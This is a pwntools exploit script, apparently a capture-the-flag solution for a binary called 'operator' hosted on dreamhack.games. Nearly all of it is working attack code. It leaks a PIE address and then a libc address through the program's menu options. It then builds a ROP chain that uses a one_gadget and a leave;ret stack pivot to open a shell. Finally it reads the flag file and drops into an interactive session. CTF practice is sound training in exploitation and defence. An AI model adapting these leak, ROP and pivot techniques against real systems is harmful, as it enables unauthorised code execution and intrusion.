#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'operator_patched'
HOST = 'host8.dreamhack.games'
PORT = 18214

exe = ELF(exe_path, checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x13df
brva 0x1432
brva 0x142a
continue
c 4
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

# ============================EXPLOIT============================

# leak PIE 
sla(b'>> ', b'1')
sa(b'>> ', b'A' * 0x1000)
sla(b'>> ', b'1')
p.recvuntil(b'A' * 0x1000)
pie_leak = u64(p.recv(6).ljust(8, b'\x00'))
pie_base = pie_leak - 0x2008
log.success(f'PIE leak: {hex(pie_leak)}')
log.success(f'PIE base: {hex(pie_base)}')

# gadgets
leave_ret = 0x15d5 + pie_base # avoid 0x0a (0x130a) mov eax, 0x0; leave; ret
ret = 0x101a + pie_base
pop_rbp = 0x1213 + pie_base
add_ptr_rsp = 0x1212 + pie_base #  add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret

main = 0x154c + pie_base
puts_plt = 0x10c0 + pie_base
puts_got = 0x3f98 + pie_base
printf_plt = 0x10e0 + pie_base
read_plt = 0x10f0 + pie_base
# refill opt 1
s(cyclic(0x1000))

# base + 0x15c3
# base + 0x4020 < 0xYXXc3 < base + 0x5020

# leak libc
sla(b'>> ', b'2')
sla(b'offset: ', b'48')
sla(b'bit index (7 ~ 0): ', b'6')
p.recvuntil(b'ffffff83' + b'\n')
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = libc_leak - 0x620d0
log.success(f'libc leak: {hex(libc_leak)}')
log.success(f'libc base: {hex(libc.address)}')

# ROP chain
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))
pop_rdi = 0x02a3e5 + libc.address
sl(b'1')
one_gadget = libc.address + 0xebcf5
payload = b'B' * 0x17 + p64(ret)
payload += p64(pop_rbp) + p64(pie_base + 0x6000) + p64(ret) + p64(one_gadget)

sla(b'>> ', payload)

fake_rbp = pie_base + 0x4020
sla(b'>> ', b'2')
sla(b'offset: ', b'40')
sa(b'bit index (7 ~ 0): ', b'7' + p64(fake_rbp)[1:] + p64(leave_ret)[:6]) # leave ret to pivot rsp

# get flag
sl(b'cat flag*')
p.interactive()
